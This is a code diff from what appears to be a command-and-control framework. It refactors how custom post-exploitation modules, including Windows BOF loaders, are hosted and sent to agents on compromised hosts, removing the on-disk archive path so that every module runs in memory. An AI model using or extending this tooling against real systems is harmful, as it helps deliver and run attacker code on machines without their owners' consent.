@@ -70,13 +70,6 @@ func moduleCustom(ctx *c2context.C2Context) {
 		return
 	}
 
-	// interactive modules rely on echo handshake before SSH handoff
-	if config.AgentConfig.IsInteractive {
-		invocation.Argv = []string{"echo", crypto.SHA256SumRaw([]byte(def.MagicString))}
-		invocation.Stdin = ""
-		invocation.Coff = nil
-	}
-
 	// Pre-flight every dependency this module declares (module config
 	// "dependencies", e.g. the auto-added "coffloader" for Windows BOFs):
 	// make sure each dependency's payload is hosted and downloadable for the
@@ -93,21 +86,9 @@ func moduleCustom(ctx *c2context.C2Context) {
 		}
 	}
 
-	invBytes, err := cbor.Marshal(invocation)
-	if err != nil {
-		logging.Errorf("Encoding invocation: %v", err)
-		return
-	}
-	invB64 := base64.StdEncoding.EncodeToString(invBytes)
-
-	// if in-memory module
-	if config.AgentConfig.InMemory {
-		handleInMemoryModule(ctx, *config, payload_type, invocation, peerIP)
-		return
-	}
-
-	// other modules that need to be saved to disk
-	handleCompressedModule(ctx, *config, payload_type, invB64, peerIP)
+	// Every agent module runs in memory; there is no on-disk/fork-and-run
+	// path. handleInMemoryModule re-encodes the invocation for the agent.
+	handleInMemoryModule(ctx, *config, payload_type, invocation, peerIP)
 }
 
 // build_module builds a local module using `build.sh`, passing flags as args to `./build.sh`
@@ -238,7 +219,7 @@ func handleInMemoryModule(ctx *c2context.C2Context, config def.ModuleConfig, pay
 		return
 	}
 	fileToDownload := filepath.Base(hosted_file)
-	cmd := fmt.Sprintf("%s --mod_name %s --type %s --file_to_download %s --checksum %s --in_mem --invocation %s",
+	cmd := fmt.Sprintf("%s --mod_name %s --type %s --file_to_download %s --checksum %s --invocation %s",
 		def.C2CmdCustomModule, strings.ToLower(live.ActiveModule.Name), payload_type, fileToDownload, crypto.SHA256SumFile(hosted_file), strconv.Quote(invB64))
 	if peerIP != "" {
 		cmd += fmt.Sprintf(" --peer %s", strconv.Quote(peerIP))
@@ -280,73 +261,6 @@ func hostModuleFile(moduleName, fileName, path string) (def.ResolvedModuleFile, 
 		MemPath:  fmt.Sprintf("memfs:///%s/%s", strings.ToLower(moduleName), base),
 		Checksum: crypto.SHA256SumFile(hostedPath),
 	}, nil
-}
-
-func handleCompressedModule(ctx *c2context.C2Context, config def.ModuleConfig, payload_type, invocationB64, peerIP string) {
-	moduleName := strings.ToLower(live.ActiveModule.Name)
-	tarball_path := live.WWWRoot + moduleName + ".tar.gz"
-	file_to_download := filepath.Base(tarball_path)
-	if !util.IsFileExist(tarball_path) {
-		logging.Infof("Compressing %s with tar.gz...", moduleName)
-		path := config.Path
-		err := util.TarArchive(path, tarball_path)
-		if err != nil {
-			logging.Errorf("Compressing %s: %v", live.ActiveModule.Name, err)
-			return
-		}
-		logging.Infof("Created %.4fMB archive (%s) for module '%s'",
-			float64(util.FileSize(tarball_path))/1024/1024, tarball_path, live.ActiveModule.Name)
-	} else {
-		logging.Infof("Using cached %s", tarball_path)
-	}
-
-	checksum := crypto.SHA256SumFile(tarball_path)
-	cmd := fmt.Sprintf("%s --mod_name %s --checksum %s --invocation %s --type %s --file_to_download %s",
-		def.C2CmdCustomModule,
-		moduleName, checksum, strconv.Quote(invocationB64), payload_type, file_to_download)
-	if peerIP != "" {
-		cmd += fmt.Sprintf(" --peer %s", strconv.Quote(peerIP))
-	}
-	job_id := uuid.NewString()
-	err := CmdSender(cmd, job_id, ctx.Target.Tag)
-	if err != nil {
-		logging.Errorf("Sending command %s to %s: %v", cmd, ctx.Target.Tag, err)
-	}
-
-	if config.AgentConfig.IsInteractive {
-		handleInteractiveModule(config, job_id)
-	}
-}
-
-func handleInteractiveModule(config def.ModuleConfig, job_id string) {
-	opt, exists := config.Options["args"]
-	if !exists {
-		config.Options["args"] = &def.ModOption{
-			Name: "args",
-			Desc: "run this command with these arguments",
-			Val:  "",
-			Vals: []string{},
-		}
-	}
-	args := opt.Val
-	port := strconv.Itoa(util.RandInt(1024, 65535))
-	look_for := crypto.SHA256SumRaw([]byte(def.MagicString))
-
-	for i := 0; i < 10; i++ {
-		if res, ok := live.CmdResultString(job_id); ok {
-			if strings.Contains(res, look_for) {
-				break
-			}
-		}
-		util.TakeABlink()
-	}
-	defer func() {
-		live.CmdResults.Delete(job_id)
-	}()
-
-	_ = args
-	_ = port
-	logging.Warningf("Interactive module %s is disabled because SSH/SFTP and port-forwarding were removed", config.Name)
 }
 
 // hostDLLModules compresses and hosts every DLL module's payload so that
